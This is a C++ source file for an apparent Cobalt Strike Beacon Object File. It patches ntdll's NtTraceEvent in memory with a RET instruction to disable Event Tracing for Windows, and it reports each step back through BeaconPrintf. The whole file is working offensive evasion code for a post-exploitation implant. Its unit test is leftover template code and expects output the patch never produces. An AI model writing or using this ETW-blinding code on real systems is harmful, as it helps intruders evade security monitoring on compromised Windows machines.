#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
    // Define the Dynamic Function Resolution declaration for the GetLastError function
    DFR(KERNEL32, GetLastError);
    DFR(KERNEL32, GetProcAddress);
    DFR(KERNEL32, GetModuleHandleA);
    DFR(NTDLL, NtProtectVirtualMemory);
    DFR(NTDLL, NtWriteVirtualMemory);
    // Map GetLastError to KERNEL32$GetLastError 
#define GetLastError KERNEL32$GetLastError 
#define GetProcAddress KERNEL32$GetProcAddress
#define GetModuleHandleA KERNEL32$GetModuleHandleA
#define NtProtectVirtualMemory NTDLL$NtProtectVirtualMemory
#define NtWriteVirtualMemory NTDLL$NtWriteVirtualMemory

    void go(char* args, int len) {
        
        HANDLE hProc = 0;
        NTSTATUS success;

        DWORD oldPro = 0;
        LPVOID ptrNtTraceEvent = NULL;
        HMODULE ntdll = NULL;
        HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
        unsigned char patch[] = { '\xc3' };
        SIZE_T sizeOfPatch = sizeof(patch);
        char* ntTraceEvent = "NtTraceEvent";
        char* masterDLL = "ntdll.dll";

        ntdll = GetModuleHandleA((LPCSTR)masterDLL);
        //ntdll = GetModuleHandleA((LPCSTR)masterDLL);
        if (ntdll != 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle to NTDLL obtained.\n");


        ptrNtTraceEvent = GetProcAddress(ntdll, ntTraceEvent);
        if (ptrNtTraceEvent != NULL) BeaconPrintf(CALLBACK_OUTPUT, "[+] Pointer to NtTraceEvent obtained.\n");
        char* value = (char*)ptrNtTraceEvent;

        BeaconPrintf(CALLBACK_OUTPUT, "[+] NtTraceEvent 3rd byte before patching: %x\n", *(value + 3));

        success = NtProtectVirtualMemory(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, PAGE_EXECUTE_WRITECOPY, &oldPro);
        if (success == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] Protection of NtTraceEvent changed to wcx.\n");

        success = NtWriteVirtualMemory(hCurProc, value + 3, (PVOID)patch, 1, (SIZE_T*)NULL);
        if (success == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] RET instruction copied successfully.\n");

        BeaconPrintf(CALLBACK_OUTPUT, "[+] NtTraceEvent 3rd byte after patching: %x\n", *(value + 3));

        success = NtProtectVirtualMemory(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, oldPro, &oldPro);
        if (success == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] Protection of NtTraceEvent restored");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif